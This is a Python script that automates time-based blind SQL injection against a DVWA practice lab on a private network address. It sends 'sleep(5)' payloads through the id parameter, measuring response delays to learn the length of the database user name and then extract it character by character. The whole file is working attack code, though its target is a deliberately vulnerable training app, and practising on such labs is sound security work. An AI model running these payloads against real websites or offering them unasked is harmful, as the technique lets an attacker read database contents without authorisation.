import requests
import re

class Dvwa(object):
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36'
        }
        self.cookies = 'security=low; PHPSESSID=256e143f5a8507bc1df0707a297eefa1'
        self.base_url = 'http://192.168.174.129/dvwa/vulnerabilities/sqli_blind/?id=1{}&Submit=Submit#'
        self.base_url1 = ''
        self.base_url2 = ''
        self.cook_dict = {}
        # self.names = ['database()','current_user()','system_user()','version()','user()','@@datadir','@@version_compile_os']
        self.infos = {}
        self.names = ['user()']

    #得到cookie_dict
    def get_cook_dict(self):
         self.cook_dict = {
            cookie.split('=')[0]: cookie.split('=')[1] for cookie in self.cookies.split('; ')
        }

    # 发起请求，得到请求时间
    def get_response_time(self, url):
        response = requests.get(url, headers=self.headers, cookies=self.cook_dict)
        time = response.elapsed.total_seconds()
        return time

    def weiyi_zhuru(self):
        self.get_cook_dict()
        a = ''
        h = ''
        for i in range(1,200):
            url1 = 'http://192.168.174.129/dvwa/vulnerabilities/sqli_blind/?id=1%27+and+if(length(user())%3d{}%2csleep(5)%2c1)+--+&Submit=Submit#'.format(i)
            if self.get_response_time(url1) >= 5:
                    h = i

        for d in range(1, h + 1):
            for k in [7, 6, 5, 4, 3, 2, 1, 0]:
                for j in range(0, 177):
                    url2 = 'http://192.168.174.129/dvwa/vulnerabilities/sqli_blind/?id=1%27+and+if((ascii(+mid((user())from('+str(d)+'))+)+%3e%3e+{})%3d{}%2csleep(5)%2c1)+--+&Submit=Submit#'.format(
                         k, j)
                    if self.get_response_time(url2) >= 5:
                        print(k, j)
                        if k == 0:
                            a += chr(j)
                            print(a)

if __name__ == '__main__':
    Dvwa().weiyi_zhuru()
